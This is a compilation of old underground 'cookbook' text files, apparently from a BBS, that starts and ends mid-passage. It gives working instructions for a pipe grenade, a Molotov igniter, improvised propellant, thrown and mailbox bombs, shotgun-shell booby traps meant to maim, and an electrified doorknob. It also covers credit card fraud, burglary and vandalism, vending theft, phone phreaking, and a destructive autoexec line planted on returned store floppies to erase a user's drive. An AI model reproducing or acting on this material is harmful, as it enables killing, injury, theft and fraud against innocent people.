      and  tape.  Make sure the folder cover will fit tightly around the
      taped match heads. Leave cover open at opposite end for  insertion
      of the matches.

      4)  Push the taped matches into the tube until the bottom ends are
      exposed about 3/4 in. (2 cm)

      5) Flatten and fold the open end of the tube so that it laps  over
      about 1 in. (2-1/2 cm); tape in place.

      Use with a Molotov Cocktail:
      ---------------------------

      1)  Tape  the  "match  end  tab" of the igniter to the neck of the
      molotov cocktail.

      2) Grasp the "cover and  tab"  and  pull  sharply  or  quickly  to
      ignite.

      General Use:
      -----------

      The  book  match igniter can be used by itself to ignite flammable
      liquids, fuse cords, and similar items requiring hot ignition.

      CAUTION: Store matches and  completed  igniters  in  moistureproof
      containers  such  as  rubber  or plastic bags until ready for use.
      Damp or wet paper book matches will not ignite.

          "Red or White Powder" Propellant may be prepared in a  simple,
      safe  manner.  The  formulation  described  below  will  result in
      approximately 2 1/2  pounds  of  powder.  This  is  a  small  arms
      propellant  and  should  only  be  used  in  weapons  with 1/2 in.
      diameter or less (but not pistols!).

      Material Required:
      -----------------

      Heat Source (Kitchen Stove or open fire)
      2 gallon metal bucket
      Measuring cup (8 ounces)
      Wooden spoon or rubber spatula
      Metal sheet or aluminum foil (at least 18 in. sq.)
      Flat window screen (at least 1 foot square)
      Potassium Nitrate (granulated) 2-1/3 cups
      White sugar (granulated) 2 cups
      Powdered ferric oxide (rust) 1/8 cup (if available)
      Clear water, 1-1/2 cups

      Procedure:
      ---------

      1) Place the sugar, potassium nitrate, and water  in  the  bucket.
      Heat  with  a low flame, stirring occasionally until the sugar and
      potassium nitrate dissolve.

      2) If available, add the ferric  oxide  (rust)  to  the  solution.
      Increase the flame under the mixture until it boils gently.

      NOTE: The mixture will retain the rust coloration.

      3) Stir and scrape the bucket sides occasionally until the mixture
      is  reduced  to  one  quarter  of  its  original volume, then stir
      continuously.

      4) As the water evaporates, the mixture will become thicker  until
      it  reaches the consistency of cooked breakfast cereal or homemade
      fudge. At this stage of thickness, remove the bucket from the heat
      source, and spread the mass on the metal sheet.

      5) While the material cools, score it with a spoon or  spatula  in
      crisscrossed furrows about 1 inch apart.

      6)  Allow the material to dry, preferably in the sun. As it dries,
      resore it accordingly (about every 20 minutes) to aid drying.

      7) When the material has dried to a point  where  it  is moist and
      soft  but  not  sticky to the touch, place a small spoonful on the
      screen. Rub the material back and forth against  the  screen  mesh
      with  spoon  or other flat object until the material is granulated
      into small worm-like particles.

      8) After granulation, return the material to the sun to  allow  to
      dry completely.

        See later powder filez........  -= Mondain =-      Pipe Hand Grenade                           by Mondain

          Hand  Grenades  can  be  made  from  a piece of iron pipe. The
      filler  can  be  of  plastic  or  granular   military   explosive,
      improvised  explosive,  or  propellant  from shotgun or small arms
      munition.

      Material Required:
      -----------------

      Iron Pipe, threaded ends, 1-1/2" to 3" diameter, 3" to 8" long.
      Two (2) iron pipe caps
      Explosive or propellant
      Nonelectric blasting cap (Commercial or military)
      Fuse cord
      Hand Drill
      Pliers

      Procedure:
      ---------

      1) Place blasting cap on one end  of  fuse  cord  and  crimp  with
      pliers.

      NOTE: To find out how long the fuse cord should be, check the time
      it takes a known length to burn. If 12 inches burns in 30 seconds,
      a 6 inch cord will ignite the grenade in 15 seconds.

      2)  Screw  pipe  cap  to one end of the pipe. Place fuse cord with
      blasting cap into the opposite end so that  the  blasting  cap  is
      near the center of the pipe.

      NOTE:  If  plastic  explosive  is  to  be  used,  fill pipe BEFORE
      inserting blasting cap. Push a round stick into the center of  the
      explosive to make a hole and then insert the blasting cap.

      3)  Pour explosive or propellant into pipe a little bit at a time.
      Tap the base of the pipe frequently to settle filler.

      4) Drill a hole in the center of  the  unassembled  pipe  caplarge
      enough for the fuse cord to pass through.

      5)  Wipe  pipe  threads  to  remove any filler material. Slide the
      drilled pipe cap over the fuse and screw handtight onto the pipe.

                        Originally typed by the Jolly Roger.U.K. CREDIT CARD FRAUD - 22/10/90 - Written by CREDITMAN

U.K. credit card fraud is a lot  easier  than over in the States.  The
same basic 3 essentials are needed -

          1...A safehouse.
          2...Credit card numbers with Xp date and address.
          3...Good suppliers of next day delivery goods.

1...The Safehouse
The safehouse should be on the ground floor, so as not to piss off
the delivery man when he comes  to  drop off your freshly stolen gear.
If he has to go up 10 flights in  a complete dive and some 14 year old
kid signs for an A2000 then he's gonna wonder!  Make sure there are no
nosey neighbours, a good area is one  full of yuppies 'cos they all go
to work during daytime.  Safehouses  are  usually obtained by paying a
month's rent in  advance  or  putting  down  a  deposit  of say, 200.
Either that or break into a place and use that.

2...Credit Card Numbers.
The card number, expiry  date,  start  date  (if  possible), full name
(including middle inital), phone number and full address with postcode
are ideal.  If you can  only  get  the  sirname,  and no postcode, you
shouldn't have any real hassle.  Just  say  you moved recently to your
new address.  Phone number is handy, if it just rings and rings but if
it doesn't, then make  sure  it's  ex-directory.   You CANNOT get away
with giving them a bullshit  phone  number.  Some fussy companies want
phone numbers just to cross-check  on  CARDNET  but generally it's not
needed.  To recap, here's a quick check-list...


             1.Card number and Xpiry date.
             2.Name and address of card holder.
             3.First name/initials (OPTIONAL)
             4.Start date (OPTIONAL)
             5.Postcode (OPTIONAL)
             6.Phone number (OPTIONAL)

If you have all 6, then you  shouldn't have any hassle.  Start date is
the rarest item you could  be  asked  for,  postcode and initals being
more common.  If you are missing 3-6 then you need one helluva smooth-
talking bastard on the phone line!!!!

3...The Ordering
Not everyone can order 1000's of stuff  - it's not easy.  You have to
be cool, smooth and  have  some  good  answers  to their questions.  I
advise that you only order up to 500 worth of stuff in one go, but if
you have details 1-6 and the phone number will NOT be answered from 9-
5.30 P.M. then go up to  1000  (make  sure  it's a GOLD card!).  When
getting ready to order make sure you  have at least 3 times the amount
of suppliers you need e.g.if you want to card 5 hard-drives, make sure
you have 15 suppliers.  A lot of  the time, they are either out stock,
can't do next day delivery or won't deliver to a different address.
Quick check list of what you must ask before handing over number -

       1.Next day delivery, OK?
       2.Ordered to different address to card, OK?
       3.Do you have item in stock (pretty obvious, eh?)

Make sure you ask  ALL  of  these  questions  before handing over your
precious number.

Excuses...
Usual excuses for a  different  address  are  that  it's  a present or
you're on business here for the  next  5  weeks etc.  Any old bullshit
why it won't go to the proper address.

WARNING!*******Invoices!*******WARNING!
Invoices are sometimes sent out  with  the  actual parcel but they are
also sent out to the  card  owners  (why  do  you  think they need the
address for?) so using a safehouse for more than 2 days is risky.  A 1
day shot is safe, if they catch  on then they'll stop the goods before
getting a search warrant.

Credit Limits...
Limits on cards reach from 500 to  4000 on Gold cards.  Your average
card will be about 1000-1500.  It takes  a  while to build up a good
credit rating in order to have large  limits so don't think every card
will hold 12 IBM 386's!  Visa  and  Access  are always used - American
Xpress etc. are USELESS.

         Access = Eurocard, Mastercard (begins with 5)
         Visa = (begins with 4, 16 digit is a Gold)

A general rule is, always  confirm  an  order  to  make sure credit is
cleared.  As the month goes on, credit is  used up - the bad times are
from 27th - 3rd which is  when  all  the  bills come in.  Best time to
card is around 11th or 12th, when  the  poor guy has paid off his last
bill so you can run up a new one (he, he, he!).

Ideal items to card...

The best stuff is always computer hard-ware as it's next-day.  Amigas,
ST's, PC's -  anything  really.   Blank  discs  are  a  waste of time,
they're too heavy.  Xternal drives,  monitors  - good stuff basically.
Don't  order  any  shit   like   VCR's,  hi-fi,  video-cameras,  music
keyboards, computer software, jewerely or anything under 300.  You'll
find the listed items  are  difficult  to  get  next  day delivery and
usually won't deliver to a  different  address - bastards, eh?  You're
wasting your time with little items under 300, try to keep deliveries
under 10 a day.

The drop....
Two ways of doing the drop

     1.Sign for all the gear (make  sure you're there between 9.00 and
5.30 P.M.)

     2.Don't turn up till around 6.30  P.M.  and collect all the cards
that the delivery man has left.  These usually say 'you were out at XX
time so could you please  arrange  new  time  for  delivery or pick up
from our depot'.  In that case, piss off  to the depot and get all the
gear (need a big car!).

Remember, carding is ILLEGAL  kiddies,  so  don't  do it unless you're
going to cut me on it!!!!

                            POTASSIUM BOMB



 This is one of my favorites.  This creates a very unstable explosive in a very
 stable continer.  You will need:


 1) A two-ended bottle.  These are kinda hard to find, you have to look around,
  but if you cant find one, you will need a similar container in which there
  are two totally seperate sides that are airtight and accessable at the ends,
  like this:

                           !airtight seperator!
                    ________________!_________________
                   |                |                 |
                   /                |                 \
               ----                 |                  ----
              | c  |                |                 |c   |
              |  a |                |                 | a  |                   
              |___p|                |                 |__p_|
                   \                |                 /
                   |                |                 |
                   -----------------|-----------------

  the seperator MUST remain airtight/watertight so this doesn't blow off your
  arm in the process (believe me. it will if you are not exact)

 2) Pure potassium. Not Salt Peter, or any shit like that.  This must be the
  pure element.  This again may prove hard to find.  Try a school chemistry
  teacher.  Tell her you need it for a project, or some shit like that.  Try
  to get the biggest piece you can, because this works best if it a solid
  chuck, not a powder.  You can also try Edmund Scientific Co. at:

  Dept. 11A6
  C929 Edscorp Bldg.
  Barrington, NJ 08007
  
  or call 1-(609)-547-8880

  
 3) Cotton
 
 4) Water


  Instructions:


  Take the cotton and stuff some into one end of the container lining one side
  of the seperator.  Place some potassiun, about the size of a quarter or 
  bigger (CAREFULLY, and make sure your hands are PERFECTLY DRY, this stuff
  reacts VERY VIOLENTLY with water) into that side and pack it in tightly with
  all the cotton you can fit.  Now screw the cap on TIGHTLY.
  	On the other side of the seperator, fill it with as much water as will
  fit, and screw that cap on TIGHTLY.  You are now in possession of a compact
  explosive made somewhat stable.  To explode, throw it at something! The water
  will react with the potassium, and BBBOOOOOOMMMM!!!  Works great on windows
  or windshields, because the glass fragments go everywhere (stand back) and 
  rip stuff apart.  The bigger the piece, the bigger the boom.  If no potassium
  can be found, thy looking for PURE Sodium, it works well too.
	Mondain relenquishes any responsibility to anyone who attempts this.  
  You are on your own....... 



     PS: you could also place this little sucker under the wheel of a car of 
  someone you hate...(Wait till' they back over that one!!!).

                    How The Law Protects Juvenile Offenders
                            (or tries to, anyway)





Juveniles accused of breaking the law are granted some special rights intended 
to protect the, because of their age.  If a juvenile is charged with a crime 
punishable by a term in a reform school or juvenile detention facility, he is 
assured the right to:


1)  Remain silent, and not incriminate himself/herself.
2)  Be placed in quarters seperate from adult offenders while being held in
custody.
3)  Be notified before a hearing of the charges against him.
4)  Be released to his parents or guardians after signing a written promise to
appear at his trial (unless the child is likely to run away and not come back
to court unless he is dangerous or may himself be in danger if sent back home).
5)  Be tried at proceedings that are closed to the public.
6)  Have a record of the proceedings made, in case one is needed for a future 
appeal.
7)  Be represented by a lawyer.
8)  Have a lawyer appointed by the court if he cannot afford one.
9)  Confront his accusers.
10) Have his lawyer cross-examine witnesses.


Again, these rights are for after you have been arrested.

                       Phunn With Shotgun Shells



This phile is for those have no concern for themselves or the person they 
wanna fuck over with this. (in short, a fucking MANIAC!!!)


DoorBlams
---------

Shotgun shells are wonderful.  They can be used in almost any situation where 
pain or amputation of limbs is concerned (including your own if you are not
XTREEMLY careful. The best way to use shells, is the DoorBlam. The DoorBlam is
a simple concoction of a shell taped to the back of a door with the ignition
button facing away from the door (so it blows out against the door). Now 
position it somewhere where it will do the damage you want.  ie- near the top
for decapitation, middle for slow death, or low to make the victims kneecaps
fly across the room.  Now tape a thumbtack against a wall or something that
that part of the door bumps up against. Tape it to the wall so that the point
pokes through the tape, and position it so it will hit the ignit. button upon
impact... Its that simple.  Instant pain!


Long Range Explosives
---------------------

These are THE most difficult explosive i have ever tried to make (people i know
have lost fingers and hands to this little fucker)  IF you have a VVVVERY still
hand, it might be accomplished.  Ignit. buttons usually take some force to 
make it blow, so CAREFULLY & LIGHLT push a tack through tape and tape it to 
the back of the shell, with the tip of the tack LIGHTLY touching the button.
Add more tape to the back to hold the pin in place. If you still have hands at 
this point, consider yourself lucky.  Now you need to add a weight to the 
tack-end part to make sure it hits the ground first. Taping small rocks or 
making the shell by putting heavy loads towards the button helps.  Placing a 
cracker (yes a cracker (Saltines, anyone ?)) between the tack-point and the 
button helps prevent detonation upon THROWING, which DOES happen.  Now toss 
it up high and AWAY from you, and RUN LIKE SHIT does after you eat Mexican.



These two pranx are HIGHLY UNRECOMMENDED, and Mondain takes NO responsibility for
any causes of performing them nor the results.

crafting it themselves...not me !.  I believe that the other guy 
should build the stuff, and I'll steal it and use it later.  This is 
a list of places where one can obtain the devices that would other 
wise have to be built by hand.  But after all, a good phreak can 
take a pre-made item and adapt it to his needs.....

  Drip Timer


Another method of time delay for explosives that are detonated by 
electric means, is the drip timer.  Fill a 'baggie' with water and 
then add as much salt as the water will hold.  Seal it, leaving some 
air inside.  Then, tape the two contact wires from which the circut 
has been broken, to the inside of a large cup. Place the baggie on 
the cup.  Poke a hole in the top of the 'baggie', where there is 
air, and then make a hole in the bottom to let the water drain into 
the cup.  As any Einstien figures, the salt water level in the cup 
will eventually cunduct electricity at the moment both wires touch 
water, thus completing the circut.  I have yet to try this timer 
out, and I got the plans from a total idiot, phreaker nonetheless, 
and doubt it would work with any power source under 12v.

                  ++          STEALING         ++
                  +++++++++++++++++++++++++++++++



It is strange just how many files there are out there that try to 
document the art of stealing.  After all, it IS an art.  You have to 
be calm, smooth, persistant, patient.  Stealing is not an overnight- 
planned operation.  You should try to prepare for at least a week or 
more when planning to steal from a house, and even LONGER when from 
a business.  Storytime, kiddies:

    A long time ago, well, in the past year, my friends and I 
noticed that the building complex in our town was the perfect place 
to obtain unpaid-for items.  We learned all we could about the 
complex, which was about 365,000 sqft, and each company consisted of 
an office (fully furnished with cool computer stuff), and a 10,000 
sqft (roughly) warehouse, all interconnected, and all one level.  
This information was obtained through several calls to the town 
committee (board of development, or some shit like that, the place 
that you call for building permits, and the like.), and we obtained 
the blueprints for the whole complex.  We planned a route from the 
side entrance through the warehouse, and into the offices, where all 
the good stuff is usually loacated.  Now that we had our route, all 
we needed was a plan to get inside.  Since this was our first major 
job, we spent a few good weeks on preparation.  During the snow 
weather, we worked w/ a company to shovel the sidewalks of the 
complex.  One night, at about 11 pm, we stopped shoveling in front 
of our planned job site, Campbells Soup, Co.  There was nobody there 
except the janitors that cleaned up the place (or so we thought).  I 
asked the janitor if I could use the bathroom (I did have to go too) 
and he let me in.  I must have surprised him when I knew exactally 
where the bathroom was!  As I walked to it, I scanned for vid cams, 
infrared guns/recievers (little boxes at entrances with a black 
glass square about 1" sq. at about knee hight on each side).   
Nothing.  The doors all had security magnetic detection at the tops, 
and also the windows.  To think someone would break in through an 
obvious place like a large window, stupid.  To my surprise, there 
were a few losers working late, and did'nt really care that I was 
there at all.  Take another Viverin' guys, I wont be here long.  The 
smell of black coffee was stifeling.  The bathroom was located back 
by the office's entrance to the warehouse, and to my surprise, it 
was unlocked!  The lights were on, and the place was totally empty, 
except for a few cardboard remains, and shelves, and that blessed 
side door.  I walked over to the door to examine it.  No security, 
no vid cams in the warehouse, no nothing.  Odd, usually these 
warehouses were kept tight as a hookers pussy.  But it looked like 
they were packing up to move somewhere.  Boxes on the office desks, 
etc..  The door was locked with a key deadbolt (pain to pick) and a 
regular door-knob key lock.  No problem.  I needed to stop that 
deadbolt from being locked, so I looked around for something to 
use....aha!  There was some strange material like alum. foil on the 
ground, pliable, yet of a black color.  I took out a small allen key 
(a thief never goes ANYWHERE without a small lockpicking tool) and 
crammed enough of the stuff into the keyhole so that a key could not 
be inserted far enough to turn, and the stuff was inn to far to be 
pulled out.  Viola!  Back to the point of this story.  When the time 
came to make our move, something strange happened.  The place was 
abandoned for 3 days straight, most office equipment removed, and 
the front door left ajar, for all 3 days.  We still decided to enter 
via our planned route.  At 1:30am we went to the side door, and what 
a surprise, the deadbolt lock was open.  Now to the knob lock.  It 
was still locked, but not a problem.  Knob locks usually look like 
this:


                       |-wall socket>
     --------------------------
                       |       )
 d   -------------------------------|
 o                     |            |
 o                     |           )
 r                     |         )
                       |       )
     -------------------------
                       |
                       |-wall socket>

The top sliding piece is about 1/4" wide on popular locks, with the 
bar facing you, if the door swings outward.  With the smallest 
allenkey you can get, stick it in and repeatively push and slide it 
back towards the knob, but don't let go, because it is spring loaded 
and will snap back into place again.  Now for the larger bar.  Take 
another key and wedge it into the slot where the bar enters the 
other wall (without the knob on it)! and do the same thing.  This 
will be considerably harder to do than with the small tongue, but if 
you practiced like you should have, it will open with minimum effort.
Now we were inside.  We ran through the warehouse thruogh the 
warehouse/office door (these are rarely locked, but try to prepare 
for it ahead of time by "cramming the lock" like I did) and into the 
office.  The place was empty, no shelves, just desks, chairs, and 
boxes.  The boxes contained modems, motherboards, bus cards, 
printers, cables, fone cable, and one contained a Zenith laptop 
computer!  No shit, this is a true story!  We took everything we 
could carry (5 people).  We took all the above mentioned, as well as 
printer toner, fones, fone jacks, documents, desk chairs, insulated 
boxes and bags (static-free kind), even the little shit things, like 
outlet plates, light bulbs, ANYTHING!!!  We went really crazy, and 
were out in 2 min 30 sec.(always set a time limit) 
    We wound up throwing half the shit away, but it felt great just 
to take anything that was not ours!! I have since then done other 
"jobs" with much more precision, and effort, as well as better 
rewards.  Here are some tips that should be followed when attempting 
to steal::


-WEAR GLOVES!!!!!!!!!!

-backpacks for everyone to put the loot in

-always case the joint for at least a week and keep documented 
records of who leaves when, what time it closes, timed lights, etc...

-have at least 4 phriends with you, and ,please, make sure they know 
what they are doing, no idiots allowed!

-bring tools :small allen keys, both types of screwdrivers, standard 
size, and tiny, hacksaw blade, wire cutters and strippers, 
spraypaint-to leave your handle on the wall, hammer, mace, gun-if 
available, flashlights (duh), wire-good for re-routing door 
security, and bolt cutters.

-designate a person to carry all the tools ONLY-don't have him 
pickup stuff and mix it with the tools, this will only slow you down 
later iff you need to look fir a tool quickly.

-designate a person to STAY PUT by the door and keep watch.

-designate a timer, one who has a lighted stopwatch.

-make runs NO LONGER THAT 3 MIN.  ENEN THIS TIME IS EXTREEMELY 
HIGH-TRY TO KEEP AS LOW AS POSSIBLE.

-getaway vehicle (preferably NOT a van or pickup truck, these will  
be vers suspicious to the pigs..er.I mean cops.  And don't speed, or 
anything, this just attracts attention.  Cover liscence plates till 
just before you get your asses going, so no one can report the 
plates to the pigs..oops!, damn, did it again, cops.  Make sure you 
remove covering before leaving.

-Always keep flashlights pointed DOWN unless necessary, crawl under 
windows, no shouting, even if you find some phucking cool shit, on 
second thought, maybe painting your handle is a little stupid, so 
forget that, wear dark clothes OVER regular, non-suspicious clothes 
(get changed first thing in the car)

-Never brag about your findings in public, only on modem, or on BBS, 
and never give names of places, phriends, and exact names of things 
taken, (just say you 'borrowed' a 486DX 33 motherboard, don't say is 
a Intel 486DX 33 mhz for an IBM PS/1 model 50, serial 
#XXXXXXXXXXXX.  that is just plain dumb)

-Have phunn!! and never steal from your neighborhood.  

-If you break into houses, never move stuff around; the longer it 
takes the yuppie family to realize that you were there, the better.

-WEAR GLOVES!!!!!!!!!!!!!

-to get in windows: shoot window with BB gun, and place clear, 
stickey hard-cover book covering on the window over the hole, 
hopefully the inpact of the shot was enough to crack the glass, and 
LEAN OR PUSH on the covered glass, do not hit or kick, and you will 
see that the majority of the glass will stick to the covering, and 
will make considerably less noise.

-enter through basement windows preferably under a deck or steps.

-MAKE SURE THE PEOPLE WILL BE GONE FOR THE NIGHT AND THE NEIGHBORS 
ARE ASLEEP (GO FOR AROUND 2:30 AM)

-take stuff that will sell easily to friends, and don't waste time 
taking things that look neat, just take the basics:  electronic, 
computer, TV, VCR, some jewelry-things you could easily hock, 
preferably without inscriptions, raid the fridge, take good quality 
fones, stereo equip., speakers, etc..

-always case the outside of the house looking for security stickers 
that yuppie families like to place in full view.

-do mischievous shit like cut all fone lines in house, cut up couch 
cushions, and flip them over so they look perfectly normal!; shoot a 
hole in their fish tank, (all yuppies own fish); slash clothes, then 
put them back into the drawer; unplug fridge; set thermostat way up 
to 99.9 degrees; leave drain plugged and let the faucet run just a 
little, (for 6 hours!!); whatever you can't take or carry out, 
destroy in a subtle way, -if you can't carry out those 130 lb wood 
case stereo speakers, slash the cones; break ballpoint pens open and 
rub them into the carpet with their shoes; run a magnet over audio 
and VCR cassettes and floppies, and anything else subtle that would 
brighten their day.

Easy explosive:

-fill Kodak film case (y'know, the black cylinder with the grey cap) 
with explosive of your choice.  Drill hole in grey lid, insert fuse, 
and tape it back together very tightly.  Light.

                        or:

-poke a hole it the grey cap facing outwards, and insert an M-80 
with fuse going through the hole and reseal, taping it tightly ALL 
AROUND the case.  Place in plastic mailbox, light, close door, and 
get the hell away!  Because of the tight airspace, the destructive 
power of the explosion is increased 5X.  Works under water too, with 
a drop of wax, or preferably rubber cement around where the cap and 
wick meet.
                         
                         and:

-fill a GLASS coke/pepsi bottle with 1 part gas, 1 part sugar, & 1 
part water. Wedge an M-80 into the top about halfway.  Shake the 
container, place in mailbox (hopefully with mail {hehe!}) light, and 
get the fuck away.  This thing sends glass shrapnel EVERYWHERE, 
including through their mail.


Doorknob Shocker:

-run a wire from one slot in wall outlet to the bracket in the wall 
that the knob's tongue inserts into.  Run another wire from the 
other slot to an inconspicuous spot on the DOORKNOB.  How does that 
one *grab* you?


Phone Loops:  (remember, tone + silence = connection)

    NUMBER     |    Tone/Silence (T/S) End  |  STATUS (on connection)
---------------------------------------------------------------------
?-???-???-????                S                no match
1-619-748-0002                T                definite tone

x-xxx-749-xxxx                T                definite tone
?-???-???-????                S                no match

1-619-739-0002                T                definite tone

?-???-???-????                S                no match

Actually, any 1-619-7x9-000x gives tone detect, finding the other 
silent connection is a wee bit harder. 

If anyone manages to complete some of these, or any loops, please 
let me know.


The only bad thing about loop lines, is that eventually the Gestapo 
finds out about the over-use of the line, and assigns the # to 
anyone who wants a new # for thier fone.  Then when phreaks begin to 
use the line again, thinking it is a loop, they get a pissed off 
yuppie who then has the call traced, and thats like putting your 
balls right in a door and slamming it.  The operator will complain 
in your face, and say some bullshit like she has your # and will 
report any disturbances to the fone co. if she sees it again.



Simple Virus/Easy Way To Return A Copied Program  (hehe!)

-when you buy a game, or something from a computer store, copy it, 
and want to return it (I know all of you do this), sometimes all the 
store does is re-cellophane it and it goes back on the shelves 
without being re-tested.  If the original floppies have an 
AUTOEXEC.BAT file on them to initiate the copying/decompression at 
boot-up, simply edit it to say:

cd\
del c:*.*
y

That'll make someone's day real funny, especially if the store tries 
to test it.  Or, in most cases the store will not accept returned 
merchandise if it is not defective, so DEFECT IT.  This is done by 
using a program that shows the date and time the originals were last 
modified (check for this BEFORE installing the program!!!!!!) such as 
Dosshell, or XTGold.  Then set the date and time on your computer to 
match the originals date and time (approx).  Install the program, 
and/or copy the originals and manuals.  Now fuck around with 
the decompression file (usually PKUNZIP), the installation file, and 
any others you see.  Now the store has no reason, and MUST accept 
the product as a return, or sometimes they will give you a return 
check for the $$, and send the program back to the manufacturer, 
which is good, because it will then be recopied, resealed, and put 
back on the shelves somewhere for another phreaker to HACK!!

(If the above date/time matching is too much of a pain for the 
really retarded out there, set your computer date/time to any past 
ones close to the originals, and fuck with ALL the files, thus 
making them all match.)



Battery Bombs:

-Batteries like Duracell, Eveready, Energizer, etc... are specially 
made for home use and will not under any condition, explode when 
simply connected to each other.  Therefore, generic batteries are 
required.  These batteries can be obtained in hick country, or from 
a shitty wholesaler.  I've heard of phriends putting 9Vs in the 
fucking microwave for a minute or so, and this is supposed to 
disable the "exploder protector", but anyone who puts batteries in a 
microwave, should have the batteries explode on them.  Mondain takes no 
responsibility for anything in this file!!!  I never found out if 2 
9v batts connected really do explode.  I hope so.


Any Blue Boxers??

-Not many people use blue boxes these days.  They've become an 
eminent danger to phreakers. Ma Bell has new equipment to detect the 
use of tone-emmitting boxes, and about the only safe place to box 
calls from is the handy-dandy pay phone at the end of the block. 
The only way to box calls today is to switch off to another 
switching system with another number:  ie-

-call a store like Toys-'R'-Us, (1-908-322-6065 Livingston, NJ) and 
ask for the technical (video game) department.  This switches the 
number from the above to the extension of the department, usually 
and extension, but it can be a totally different # you are sent to 
while you are on hold.  This is VERY good. Bullshit the employee at 
the tech dept., and wait for HIM to hang up first.  That disconnects 
you from his department, but not from the innerconnections of the 
store. (it might even be possible to dial a number and get another 
department at this point).  This is like 'stacking' trunks. Their 
dialtone (inside the store) may have a slightly higher/lower pitch 
than a dialtone at your house.  This is what you want.  Now, blow 
2600 accross the line, and you should have access to a trunk, and 
Bell Labs think that the store did it, and it is not usually 
questioned because the computer might think that it is part of their 
paging system. (not 100% sure, test around)

-when someone (preferably who you don't give a shit about) calls, 
dial *69 to ring him back.(if your area suscribes to this feature)
What sould happen is that the *69 tone asks the Bell computer to 
call back the person.  The COMPUTER does the calling at this point.  
Now when your friend picks up, bullshit him into hanging up first.  
Now the computer is getting the dialtone first, then it passes it on 
to you.  If you blow 2600 at this point, the computer may think it 
is its own equipment doing the calling.  I'm REALLY not sure about 
this one.  Hopefully this one works, but I can't test it because 
some fucked up, shit full, douche nozzle, pig fucker broke my 
MF box. <frown> MF boxes are not that hard to come by.  Many hobby 
shops, music instrument stores, or electronic stores may sell the MF 
box itself, or one that detects tones, which can be used in the 
reverse way.


Good Technical Phone Numbers:

-sometimes the hardest part of getting technical support is finding 
a place to look.  An easy place is M.I.T. (HOME OF THE ORIGINAL 
PHREAKS) Find the number for the Electronic engineering campus, call 
and say you would like the number for (give room # make one up if 
you have to), or call the person incharge of dorm assignments (buy a 
college book if you need to).  Enentually, if done right, you will 
have a list of possible #s, and set your modem on scan, and look for 
carrier detect.  One of these nerds...ahm! I mean Geniuses must have 
a computer with a modem, and these guys will answer about 100% of 
your technical problems.

-This may not really be what we would consider a bomb, but it is a 
helluva great idea to phuck someone over.  You will need:

(1)-person you hate who has a car

(1)-container of liquid nitrogen (try a science shop, or Edmund 
Scientific, mentioned in several places in this Cookbook)

(6-10)-cans of generic shaving cream

(1)-free afternoon (preferably in FREEZING temperatures outside)

(1-or more)-pairs of pliars, for cutting and peeling

some phriends


Directions:

Find someone who owns a small compact car, and manage to find out 
where he keeps it at night (or while he is away!) Be able to open 
the car repeatedly.. Place a can in the liquid nitrogen for about 30 
sec.  Take it out and carefully and QUICKLY peel off the metal 
outside container, and you should have a frozen "block" of shaving 
cream.  (It helps to have more than one container, and more phriends)
Toss it into the car and do the same with all the cans.  A dozen or 
more "blocks" like this can fill and lightly PRESSURIZE a small 
car.  When he opens the door (hopefully he doesn't realize the mess 
inside due to the foggy windows), he will be covered with lbs of 
shaving cream that is a bitch to get out of upholstry. 


PS!- Try to get one is his glove compartment!!!!!

You first get a nice new dollar to work with.  Make sure there are no
rips in it.  Now, you get a thin piece of transparent plastic about
3/4 the width of the actual dollar.  It must be a good 6" or longer.
Next, you need some transparant tape.  Scotch magic tape will work
the best.  You simply tape the plastic strip to the dollar.  But, you
must be careful not to tape it more than 1/2" up the side of the dollar.
tape it on both sides (front and back, not top and bottom) of the dollar.
Now, all you have to do is use it:

Walk casually up to the secluded machine.  Take out your dollar, and put
it into the machine.  BE CAREFUL! Some of the more modern change machines
have alarms!  Most likely, though, drink or candy machines will not.  Now,
the machine starts taking your dollar.... You wait until your plastic
strip is almost all the way into the machine, and then you pull with
sufficient force to get the dollar out of the machine, but not rip it.  If
You did it correctly, you should have gotten whatever you bought, and still
have your dollar for later use.  On candy machines, though, make your
selection, and then wait and pull the dollar out.  Don't worry if you don't
get it on the first few tries.  It took me about 5 tries to master it.  It
DOES, i repeat DOES work for a fact if done correctly.  If you just can't
get it, though, either the machine is too sophisticated, or you put the
tape up too high on the dollar.  Have fun!!!!

This is really a good method for opening doors that are locked.  The
only problem with this, though, is that it only works for outward
opening doors.  Ok, here we go....

1)  Realize you are not working with the actual lock, but that thing
    that sticks between the door and the wall.

2)  See how that thing is curved on one side?  Well, that is what we
    will be making use of.

3)  Acquire a large paper-clip.  If it is too short, it won't work.
    You have to also have a shoelace.  Now, onto the construction...

4)  Straighten the paper-clip.

5)  Loop one end of the paper clip around the shoelace.  The shoelace
    should be about 4/5 on one side of the clip and 1/5 on the other.
    Let's see if I can draw it.

       --- is the paper clip
       *** is the shoelace

     That's not very good, but I hope you get the picture.

6)  All you have to do now is curve the paper clip (no, I won't draw it)

7)  With the curved paper-clip, stick it between the door and the wall,
    behind the metal thing that sticks between. 

8)  Feed it through with you hand, until you can grip both sides of the
    shoelace.

9)  Now, simply pull the lace and the door at the same time, and VIOLA!
    the door is open.

I prefer this over regular lock-picking if the door opens outward, because
it is a lot quicker.  Lock picking can take 5 minutes... When done correctly
this only takes 30 seconds!  So, if you can, use this.

                    
                    BUYING EXPLOSIVES AND PROPELLANTS

     Almost any city or town of reasonable size has a gun store and one or
more pharmacies. These are two of the places that potential terrorists visit
in order to purchase explosive material.  All that one has to do is know
something about the non- explosive uses of the materials.  Black powder, for
example, is used in blackpowder firearms.  It comes in varying "grades", with
each different grade being a slightly different size.  The grade of black
powder depends on what the calibre of the gun that it is used in; a fine grade
of powder could burn too fast in the wrong caliber weapon.  The rule is: the
smaller the grade, the faster the burn rate of the powder.


                             BLACK POWDER

     Black powder is generally available in three grades.  As stated before, the
smaller the grade, the faster the powder burns.  Burn rate is extremely
important in bombs.  Since an explosion is a rapid increase of gas volume in a
confined environment, to make an explosion, a quick-burning powder is desirable.
The three common grades of black powder are listed below, along with the usual
bore width (calibre) of what they are used in.  Generally, the fastest burning
powder, the FFF grade is desirable.  However, the other grades and uses are
listed below:

     GRADE              BORE WIDTH               EXAMPLE OF GUN
                                  
     F                  .50 or greater           model cannon; some rifles
     FF                 .36 - .50                large pistols; small rifles
     FFF                .36 or smaller           pistols; derringers

     The FFF grade is the fastest burning, because the smaller grade has more
surface area or burning surface exposed to the flame front.  The larger grades
also have uses which will be discussed later.  The price range of black
powder, per pound, is about $8.50 - $9.00.  The price is not affected by the
grade, and so one saves oneself time and work if one buys the finer grade of
powder.  The major problems with black powder are that it can be ignited
accidentally by static electricity, and that it has a tendency to absorb
moisture from the air. To safely crush it, a one would use a plastic spoon and
a wooden salad bowl. Taking a small pile at a time, he or she would apply
